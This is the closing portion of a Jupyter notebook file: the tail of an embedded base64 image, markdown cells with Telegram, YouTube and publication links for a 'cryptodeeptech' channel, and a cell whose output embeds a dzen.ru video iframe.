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)\n",
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "Ol_lxN-2uItT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Telegram: https://t.me/cryptodeeptech\n",
        "\n",
        "YouTube: https://www.youtube.com/@cryptodeeptech\n",
        "\n",
        "Publication: https://cryptodeeptech.ru/gauss-jacobi-method\n"
      ],
      "metadata": {
        "id": "CMhOOKZqtYN9"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "iQtXuEkBt4oY"
      }
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 336
        },
        "id": "iu_kW1ztszYm",
        "outputId": "966aff3b-62ef-4a24-83f9-d7b057d4703b"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ],
            "text/html": [
              "\n",
              "<iframe width=\"560\" height=\"315\" src=\"https://dzen.ru/embed/vHLbt8wn-g08?from_block=partner&from=zen&mute=0&autoplay=0&tv=0\" frameborder=\"0\" allowfullscreen></iframe>\n"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "awBNkUt2t71z"
      }
    }
  ]
}
